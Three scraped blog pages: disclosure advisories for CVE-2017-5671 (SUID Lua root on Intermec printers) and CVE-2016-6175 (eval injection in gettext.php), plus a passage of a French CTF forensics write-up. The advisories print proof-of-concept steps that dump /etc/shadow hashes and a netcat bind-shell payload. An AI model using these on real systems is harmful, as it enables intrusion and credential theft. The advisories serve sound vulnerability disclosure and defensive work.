=== Content from kmkz-web-blog.blogspot.com_9ba7b748_20250126_100207.html ===


# kmkz's blog

Just another web blog

## 2017/03/28

### [[Advisory] CVE-2017-5671 Intermec (Honeywell) RFID Industrial printers local root w/ Busybox Jailbreak](https://kmkz-web-blog.blogspot.com/2017/03/advisory-cve-2017-5671-intermec.html)

**# Date**: January 31th, 2017

**# Author**:

    Bourbon Jean-marie (kmkz) from AKERVA company | @kmkz\_security

**# Product Homepage**:

    http://www.intermec.com/products/prtrpm43a/

**# Firmware download**:

    http://www.intermec.com/products/prtrpm43a/downloads.aspx

**# Tested on** :

    model: PM43 RFID Industrial printer

    firmware version: 10.10.011406

    kernel: Linux PM43-xxxxxxx 2.6.31 #1 PREEMPT Mon Oct 26 10:49:59 SGT 2015 armv5tejl GNU/Linux

**# CVSS**: **7.5** (CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H)

**# OVE ID**: **OVE-20170131-0001**

**# CVE ID**: **CVE-2017-5671**

**# VulnDB ID: 154533**

**# Thanks**:

    Dany Bach (Rioru) from AKERVA company for the exploitation design during the pentest during which the CVE-2017-5671 was discovered | @DDXhunter

    Honeywell team which was really reactive (with special thanks to Kevin Staggs) !

**# Credits**:

    [The security notification that Intermec (Honeywell) sent to all of their dealers](https://github.com/kmkz/exploit/blob/master/CVE-2017-5671-Credits.pdf)

**# Additional link**:

     https://akerva.com/blog/intermec-industrial-printers-local-root-with-busybox-jailbreak/

**# Affected products**:

    PM23, PM42, PM43, PC23, PC43, PD43 and PC42 printers with versions prior to March 2017

**# Fixes**:

    Download the new firmware version by using this [link](http://epsfiles.intermec.com/eps_files/eps_download/Firmware_P10.11.013310.zip)

**# Release note**: [Here](http://apps.intermec.com/downloads/eps_download/Firmware%20Release%20Notes%20x10_11_013310.pdf)

> ***Intermec (Honeywell) Industrial RFID Printers Local root privilege escalation with Busybox jailbreak***

**I. PRODUCT**

PM43/PM43c mid-range industrial RFID printers are ideal for a wide range of applications within the distribution center / warehouse and manufacturing environments.

**II. ADVISORY**

Using a bad file permission, it is possible to gain full root privilege on a PM43 (but not only) RFID industrial printer as well as from the *admin* account as *it-admin* which are the two default users on the machine.

It also permits to gain full privilege resulting on a Busybox jailbreak due to the root access on the system.

The impact of this exploitation is quite critical due to the sensitive information that are available and impact the recent firmware version release (before  March 12th 2017).

**III. VULNERABILITY DESCRIPTION**

The Lua binary rights are too permissive and this one is SUID which conduct to perform this privilege escalation using a basic trick as describe in the next section.

The default it-admin and/or admin credentials are available in the vendor's documentation and should be modified too.

**IV. PROOF OF CONCEPT**

Following steps can reproduce the privilege escalation once the attacker gain a Busybox shell on the system:

*itadmin@PM43-XXXXXXXXXXX /tmp$ find / -perm -g=s -type f 2>/dev/null
/bin/busybox
/usr/bin/cfg
/usr/bin/lua      -> **Lua binary with SUID perm.**
/usr/bin/httpd\_restore
/usr/bin/ikev2
/usr/bin/pwauth
/usr/bin/functest
/usr/bin/imecutil
/usr/bin/httpd\_fwupgrade
/usr/sbin/setkey*

We then try to execute a shell command using Lua but it seems that this one is executed with non-root privileges through the Busybox shell:

*itadmin@PM43-XXXXXXXXXXX /tmp$ /usr/bin/lua
Lua 5.1.4  Copyright (C) 1994-2008 Lua.org, PUC-Rio
> os.execute("id")
uid=1(itadmin) gid=1(itadmin) groups=1(itadmin),2(admin),3(user)*

So we identify that it is possible to read/write files with root privilege on the file system without any restrictions (we will be able to modify the shadow file in order to log in as root later):

// in the Lua interpreter:

*> f=io.open("/etc/shadow","rb")
> print(f)
file (0x17af0)
> c=f:read "\*a"
> print(c)
root:!$1$XPCuiq25$IvWw/kKeomOyQIee8XfTb1:11851:0:99999:7:::
admin:$1$Ma/qTlIw$PPPTgRVCnkqcDQxjMBtsC0:11851:0:99999:7:::
itadmin:$1$kcHXJUjT$OIgLfTDgaEAlTbHRZFPsj.:11851:0:99999:7:::
user::11851:0:99999:7:::
ftp:\*:11851:0:99999:7:::
nobody:\*:11851:0:99999:7:::
lighttpd:x:1000:1000:Linux User,,,:/home/lighttpd:/bin/sh*

We conclude this "proof of concept" by writing a file on the filesystem which demonstrate the possibilities that we now have using this kind of code:

*fp = io.popen("akerva", "w")
fp:write(anything)
fp:close()*

That gave us the following output:

*itadmin@PM43-XXXXXXXXXXX /tmp$ cat akerva
AKERVA r00t
itadmin@PM43-XXXXXXXXXXX /tmp$ ls -alsh akerva
   4 -rw-rw-r--    1 root     root           12 Jan 25 07:12 akerva*

As explained in the above text, we then over-writed the "etc/shadow" file and we validated that it is possible to gain full root access on the filesystem even if Busybox 1.15.0 (2009 release) were present, bypassing

its shell restrictions (jailbreaking it).

**V. RECOMMENDATIONS**

AKERVA's Pentesters recommended to fix it by modifying the Lua binary rights (is the SUID bit necessary?) which was done in the patched firmware.

A security fix is now available in order to mitigate this issue as shown at the beginning of this advisory.

**VI. VERSIONS AFFECTED**

This issue affects the firmware version 10.10.011406 but after reading the latest release notes it also seems to impact all versions that were released before the updated firmware.

**VII. TIMELINE**

January 19th, 2017: Vulnerability identification

January 27th, 2017: First contact with the editor (Honeywell)

January 31th, 2017: Advisory submission to Honeywell security team and CVE id request

February 1st, 2017: CVE id attributed by MITRE even if the vendor is not normally considered a priority for CVE by MITRE

February 6th, 2017: Vendor confirm the vulnerability

February 16th, 2017: Vendor inform that the fix is ready (They also proposed me to test it prior to release)

March 12th, 2017: New firmware version available

March 28th, 2017: Public advisory released

 **VIII. LEGAL NOTICES**

The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.

I accept no responsibility for any damage caused by the use or misuse of this advisory.

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[11:19](https://kmkz-web-blog.blogspot.com/2017/03/advisory-cve-2017-5671-intermec.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1882201346900001713)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1882201346900001713&from=pencil "Modifier l'article")

[Articles plus anciens](https://kmkz-web-blog.blogspot.com/search?updated-max=2017-03-28T11:19:00%2B02:00&max-results=1 "Articles plus anciens")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Articles (Atom)](https://kmkz-web-blog.blogspot.com/feeds/posts/default)

## Archives

* ▼
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ▼
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)
    - [[Advisory] CVE-2017-5671 Intermec (Honeywell) RFID...](https://kmkz-web-blog.blogspot.com/2017/03/advisory-cve-2017-5671-intermec.html)

* ►
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from kmkz-web-blog.blogspot.com_60cfe698_20250126_100205.html ===


# [kmkz's blog](https://kmkz-web-blog.blogspot.com/)

Just another web blog

## 2016/07/25

### [Advisory] CVE-2016-6175

# **Title**:
**g****ettext.****php****<= 1.0.12** **unauthenticated** **code
execution with** **POTENTIAL****privileges escalation**

# **Date**: June
25th, 2016
# **Author**:
kmkz (Bourbon Jean-marie) |
@kmkz\_security

# **Project****Homepage**: https://launchpad.net/php-gettext/
# **Download**:
https://launchpad.net/php-gettext/trunk/1.0.12/+download/php-gettext-1.0.12.tar.gz
# **Version**:
1.0.12 (latest release)
# **Tested on**:
Linux Debian, PHP 5.6.19-2+b1

# **CVSS**: **7.1**

# **CVE ID**:
**CVE-2016-6175**
# **OVE ID**:
**OVE-20160705-0004**
# **OSVD****B****ID**: n/a

# Thanks:
**Lars Michelsen** from
NagVis project where this bug was discovered and **Danilo Segan**
from gettext.php team project for
their reactivity and professionalism

# **Credits**:

<https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>
[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

# **Fix****es**:
[https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/ser](https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/serv)ver/core/ext/php-gettext-1.0.12/gettext.php

[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

**g****ettext.php
<= 1.0.12 (latest)**  **local/remote code execution** **with****POTENTIAL****privileges escalation** **issue**

I. APPLICATION

This library
provides PHP functions to read MO files even when gettext is not
compiled in or when appropriate locale is not present on the system.

This issue was
discovered by auditing Nagvis project source code, however NagVis is
not impacted by the following issue.

NagVis is a visualization addon for the well known network
managment system [Nagios](http://www.nagios.org/).

NagVis can be used to visualize Nagios Data, e.g. to display IT
processes like a mail system or a network infrastructure.

II. ADVISORY

A possible remote
(or local) code execution were identified in the **gettext.php**
file allowing an attacker to gain access on the targeted host system
and/or gain application’s privileges throught a
specially crafted .mo language file.

The **$string** variable is not sufficiently
sanitized before
to be submitted to **eval()**
function (which is dangerous) in **select\_string()**
function causing the security issue.

III. VULNERABILITY DESCRIPTION

The
**gettext\_reader****()**funtion try to test magic number that
need to match with .mo files :

**$MAGIC1 =
"\x95\x04\x12\xde";**
**$MAGIC2 =
"\xde\x12\x04\x95**";
If it seems correct
then we’ll continue.

We then extract
forms from .mo file’s header through **get\_plural\_forms()**
function and check them with a deprecated
(*since php 5.3.0* *because it can be easily bypassed
by adding a Null Byte*) **eregi()**
regexp function in order to valid they match the following
pattern:
***plural-forms:
([^\n]\*)\n***
(This regular expression matching have no effect on our payload)

Next step will be to sanitize the obtained expression string before
to practice the fatal eval() on this one.

Here is the impacted code snippet :

*snip...*
 *if (eregi("plural-forms:
([^\n]\*)\n", $header, $regs))*
 *$expr = $regs[1];*
 *else*
 *$expr = "nplurals=2;
plural=n == 1 ? 0 : 1;";*

 *$this->pluralheader
= $this→**sanitize\_plural\_expression($expr)****;***//
The
vulnerable function!!
 *}*
*snip…*

The comments presents at the beginning of
**sanitize\_plural\_expression()** function explain that this one is
here to prevent the **eval()** function attacks called later.

Comments are :
*/\*\* Sanitize plural form expression for use
in PHP eval call.*

 *@access private*
 *@return string sanitized plural form
expression\*\*/*

In fact, the security is guaranteed by a "preg\_replace"
that not permit us to inject specials chars.

*snip...*
function sanitize\_plural\_expression($expr) {

 // Get rid of disallowed characters.
 $expr =
preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '',
$expr); // « sanitizer »

 // Add parenthesis for tertiary '?'
operator.
 $expr .= ';';
 $res = '';
 $p = 0;
 for ($i = 0; $i < strlen($expr); $i++) {
// no indentation ?
 $ch = $expr[$i];
 switch ($ch) {
 case '?':
 $res .= ' ? (';
 $p++;
 break;
 case ':':
 $res .= ') : (';
 break;
 case ';':
 $res .= str\_repeat( ')', $p) . ';';

 $p = 0;
 break;
 default:
 $res .= $ch;
 }
 }
 return $res;
 }
*snip...*

Code snippet from the vulnerable function that execute eval() on the "sanitized" string :

*snip…*
 $string = $this->get\_plural\_forms();
 $string =
str\_replace('nplurals',"\$total",$string);
 $string = str\_replace("n",$n,$string);
 $string =
str\_replace('plural',"\$plural",$string);

 $total = 0;
 $plural = 0;

  eval("$string");
// eval called
…. launch my shell baby !
*snip…*

However, for example (but not only!) we can call **system**()
function with « sh » parameter in order to launch a /bin/sh
command on the targeted system and allowing us to gain an interactive
shell with application privileges on it.

A real scenario could be that a real attacker overwrites languages
files located in the /nagvis-1.8.5/share/frontend/nagvis-js/locale/
directory, in an internal repository, a Docker shared folder or any
other folder.

He now just have to wait or to execute the payload himself to obtain
his shell, that’s why this vulnerability is not so harmless !

Note :

*Apart from that we could
imagine that the attacker transform the **$expr** variable to
obtain an interactive remote shell without eval() and with (maybe)
more privileges like this :*
*$expr=
(`nc -l -p 1337 -e /bin/sh`);* //
proof of concept and screenshots joined to this advisory

Like a Perl developer could say: « there is more than one way
to do it »
IV. PROOF OF CONCEPT

Following PHP code reproduce the exploitation concept base on the
1.0.9 version
(without a crafted .mo file and joined with this advisory).

V. RECOMMENDATIONS

As explained in the
associated « bug track », it was assumed that PO and MO files would
come from untrusted translators.
Check the
permissions on PO/MO files in order to ensure the provenance and the
fact that is only accessible from trusted parties.

The project's
members are writing a new version that will patch this issue
definitively, thank you to respect their work and to apply this
temporary fix.

VI. VERSIONS AFFECTED

This issue affect the latest GETTEXT .PHP version and were found
in latest stable NAGVIS (1.8.5) version.
It could affect the a lot of web application and/or many website as
long as it will not be updated.

VII. TIMELINE

**June 21th, 2016**: Vulnerability identification
**June 21th, 2016**: Nagvis project developers and gettext.php developers
notification
**June 22th, 2016**: Nagvis project developers response
**June 25th, 2016**: Nagvis Patch release (even if not really affected)
**June
27****th,
2016**: Gettext.php
team response (from Danilo Šegan), exchange started
**July 5th, 2016**:
CVE request ID (mitre) and OVE ID request
**July 7th, 2016**:
***CVE-2016-6175*** attributed by MITRE
**July 25th, 2016**: Public disclosure

VIII. LEGAL NOTICES

The information contained within this advisory is supplied "as-is"
with
no warranties or guarantees of fitness of use or otherwise.

I accept no responsibility for any damage caused by the use or misuse
of this advisory.

[CVE-2016-6175] gettext.php code execution - PoC example:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s640/cve-2016-6175.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s1600/cve-2016-6175.png)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[13:34](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1065233655939428122&from=pencil "Modifier l'article")

#### Aucun commentaire:

[Enregistrer un commentaire](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1065233655939428122)

[Article plus récent](https://kmkz-web-blog.blogspot.com/2017/03/advisory-cve-2017-5671-intermec.html "Article plus récent")

[Article plus ancien](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html "Article plus ancien")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Publier les commentaires (Atom)](https://kmkz-web-blog.blogspot.com/feeds/1065233655939428122/comments/default)

## Archives

* ►
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)

* ▼
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ▼
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
    - [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from kmkz-web-blog.blogspot.com_ed5734e2_20250126_100208.html ===


# [kmkz's blog](https://kmkz-web-blog.blogspot.com/)

Just another web blog

## 2016/03/05

### [[Write-Up] ESGI CTF 2k16 ForensicGio (Forensic 400)](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html)

Salut à tous,

ce jeudi avait lieu le **CTF du Security Day 2016** de l'[**ESGI** Paris](http://hacklab-esgi.fr/) et auquel notre team **sec0d** participait enfin du moins ceux qui étaient là :P.

Durant ce CTF nombre de challz ont été poncés mais un en particulier sur lequel j'ai passé un moment me donne envie d'écrire ce write-up car j'avoue l'avoir pas mal apprécié (merci**@Sug4r7** de l'avoir concocté).

Allez, allons-y et arrêtons de "blablater" !

Le début du chall débute par la récupération de 2 archives tar.gz.

L'une contenant le chall et l'autre son checksum md5 pour valider de son intégrité, l'objectif pour valider ce chall étant de récupérer un flag ainsi qu'une adresse mail, allez, on se lance!!

Ces fichiers downloadés on check le md5 puis on extract le contenu de l'archive et faisons un "file" dessus afin de déterminer ce à quoi nous avons affaire:

> # cat CTF\_security\_day\_2016.tar.gz.md5
>
> **2b5dfdabf403b309c35d72b455a96201**:CTF\_security\_day\_2016.tar.gz
>
>
>
> # md5sum CTF\_security\_day\_2016.tar.gz
>
> **2b5dfdabf403b309c35d72b455a96201**

L'archive extraitre révèle un format appelé **EWF** (Expert Witness Compression Format) généré par certains tools de dump de media et/ou partitions tel que **ewfacquire** sous linux.

Ayant pu identifier la facilité de certains challs présent je tente un "string"

dessus et jouant avec "grep" afin de voir si j'en ressort quelques chose mais .. ce chall n'est pas aussi facile, poursuivons.

Kali Linux possède nativement nombre de tools pour jouer avec les dumps ewf alors je teste  **ewfinfo** dans une première approche de collecte d'info et, une fois le fichier renommé avec l'extension (**.s01**) qui va bien, j'obtiens déjà quelques résultat:
> ```
> ewfinfo CTF_security_day_2016.s01
> ewfinfo 20140608
>
> Acquiry information
>         Case number:                1
>         Description:                Security Day ESGI 2016 - Level: easy
>         Examiner name:              IT Forensic investigator
>         Evidence number:            1
>         Notes:                      578589-646712-118349-156013-637549-351670-297187-312191
>         Acquisition date:           Thu Mar  3 03:17:59 2016
>         System date:                Thu Mar  3 03:17:59 2016
>         Operating system used:      Linux
>         Software version used:      20130416
>         Password:                   N/A
>         Model:                      DataBar USB2.0
>
> EWF information
>         File format:              EnCase 6
>         Sectors per chunk:        64
>         Error granularity:        64
>         Compression method:       deflate
>         Compression level:        best compression
>         Set identifier:           6e1ec0c6-715f-f848-9119-e59a9b00dcc0
>
> Media information
>         Media type:                removable disk
>         Is physical:               yes
>         Bytes per sector:          512
>         Number of sectors:         2015232
>         Media size:                984 MiB (1031798784 bytes)
>
> Digest hash information
>         MD5:                        fff71a85859a1af7ede437178d701809
>         SHA1:                       cf0b504bd9ea6e1b7183c9652ed3a402f12b4551
> ```

Ok, première info intéréssante, pour la suite nous allons donc extraire le contenu du dump vers un format plus standard à l'aide de l'outils **ewfexport**

L'outil une fois lancé demande vers quel format l'extraire etc.. il suffit de laisser cela par défaut puis de donner un nom de fichier une fois qu'il le demander.

Il s'appelera donc "CTF2.raw" pour la suite.

De là je me dis que peut-être serait-il possible de récupérer quelque chose via un peu de file carving, je lance donc un "**foremost**", hélas son output nous ramène à la raison: non ce ne sera pas aussi simple malgrès le "easy" ci-dessus!!

> ```
> Foremost started at Fri Mar  4 01:19:56 2016
> Invocation: foremost CTF2.raw
> Output directory: /root/Bureau/CTF/ESGI/foren/output
> Configuration file: /etc/foremost.conf
> ------------------------------------------------------------------
> File: CTF2.raw
> Start: Fri Mar  4 01:19:56 2016
> Length: 984 MB (1031798784 bytes)
>
> Num         Name (bs=512)               Size         File Offset         Comment
>
> Finish: Fri Mar  4 01:20:12 2016
>
> 0 FILES EXTRACTED
>
> ------------------------------------------------------------------
>
> Foremost finished at Fri Mar  4 01:20:12 2016
> ```

Okay okay ... voyons donc voir la table de partition présente sur ce dump grâce à l'outils **mmls**.

> ```
> mmls CTF2.raw
>
> DOS Partition Table
> Offset Sector: 0
> Units are in 512-byte sectors
>
>    Slot      Start        End          Length       Description
>
> 000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
> 001:  -------   0000000000   0000002047   0000002048   Unallocated
> 002:  000:000   0000002048   0002015231   0002013184   NTFS / exFAT (0x07)
> ```

Une  partition windows semble bien présente, un simple "file" dessus indique même "**DOS/MBR Boot Sector**" ce qui indique donc que ce serait probablement bootable.

Après quelque manipulations foireuses et bricolages en tout genre, je découvre un tools appelé [**mbr\_parser.py**](https://raw.githubusercontent.com/gleeda/misc-scripts/master/misc_python/mbr_parser.py) permettant de parser ce type de fichier et d'en remonter certaines infos ce qui permet donc d'affirmer que non, pas bootable :-/

> ```
> ===== Partition Table #1 =====
> Boot flag: 0x0
> Partition type: 0x7 (NTFS)
> Starting Sector (LBA): 0x800 (2048)
> Starting CHS: Cylinder: 0 Head: 32 Sector: 33
> Ending CHS: Cylinder: 125 Head: 112 Sector: 51
> Size in sectors: 0x1eb800 (2013184)
>
>
>
> ===== Partition Table #2 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> ===== Partition Table #3 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> ===== Partition Table #4 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> Valid Signature (0xaa55): True => (0xaa55)
> ```

Nous savons alors que ce ne sera pas bootable en l'état, ok, j'ai donc pratiqué à l'extraction de chacune des partition à l'aide de **dd** en espérant que la bonne partition pourra être montée et que ce sera alors la fin de ce chall.

Nous avions donc obtenu la liste des partitions et pouvions à préent les extraire de ce dump:
> ```
> dd if=CTF2.raw of=CTF2_0.bin bs=512 skip=0 count=1
> dd if=CTF2.raw of=CTF2_1.bin bs=512 skip=2048 count=2015231
>
> file *.bin
> CTF2_0.bin: DOS/MBR boot sector; partition 1 : ID=0x7, start-CHS (snip)
> CTF2_1.bin: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "-FVE-FS-" (snip)
> ```

en revanche lors de divers essais, il s'est avéré impossible de monter le volume souhaité sur ma linux, cette partition n'étant visiblement pas "standard".

A partir de la, changement de stratégie.

Le mount ne passant toujours pas en **vfat** via **dd** ainsi qu'avec l'outils **ewfmount** sur le premier dump ewf de l'archive, nous comprenons qu'il faut essayer autre chose.
> ```
> dd if=CTF2.raw of=new.img count=1 bs=1000MiB
> file new.img
> new.img: DOS/MBR boot sector; partition 1 (snip)
>
> ```

L'idée sera donc la suivante:

1. prendre le fichier new.img et le convertir en  vmdk via qemu
2. rattacher ce vmdk à une machine virtuelle Windows et essayer de monter le volume

C'est la que mon coéquipier **Orikata** et sa machine sont intervenus!

La converion via Qemu faite`:`
> ```
>  /qemu-img convert -f raw -O vmdk /Volumes/xxx/new.img /Volumes/xxx/new.vmdk
> ```

il suffit de rattacher le vmdk en tant que volume à une VM Windows puis... SURPRISE!!

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS_750q6nYClYalWSSWSrOvmnQfHoGWjUwuonVs53ZyJwxh7kG6xJDglAS-PfiVVrgf5-17zHMZQzO6Tq9yTOXMeqa7FNUVb-I2JsANIFDiXgrAT1RGr5X5CrPF6wXLUwNIVr-8hZe86ZD/s640/F511BF5A-8944-4900-9F27-16B6D38427C7.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS_750q6nYClYalWSSWSrOvmnQfHoGWjUwuonVs53ZyJwxh7kG6xJDglAS-PfiVVrgf5-17zHMZQzO6Tq9yTOXMeqa7FNUVb-I2JsANIFDiXgrAT1RGr5X5CrPF6wXLUwNIVr-8hZe86ZD/s1600/F511BF5A-8944-4900-9F27-16B6D38427C7.png)

Un volume Bitlocker!

Voici donc la raison du temps perdu à tenter de le monter en vain sur ma Kali :/.

Ok, à partir de la comment faire pour monter ce volume sans la clef?

Et bien compliqué mais **Orikata** se rappellant qu'il est possible de monter le container via la clef de récupération via l'onglet "j'ai oublié mon mot de passe"

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY3TuQnUFqmqy3bKhbGMMLrFQPitO8kwvc-TYY8xU6xx7UgYsfkHOhzJUxXZfcsnUK9Edbd4fn6knSoJt4VgbYu8d_Gzy34e_bnVx1wftMVVe9BMzBmrQDlT_aBD11r8um-F3riUiiOV6F/s320/1D414877-E30E-4D50-972D-D781EF16C1A4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY3TuQnUFqmqy3bKhbGMMLrFQPitO8kwvc-TYY8xU6xx7UgYsfkHOhzJUxXZfcsnUK9Edbd4fn6knSoJt4VgbYu8d_Gzy34e_bnVx1wftMVVe9BMzBmrQDlT_aBD11r8um-F3riUiiOV6F/s1600/1D414877-E30E-4D50-972D-D781EF16C1A4.png)

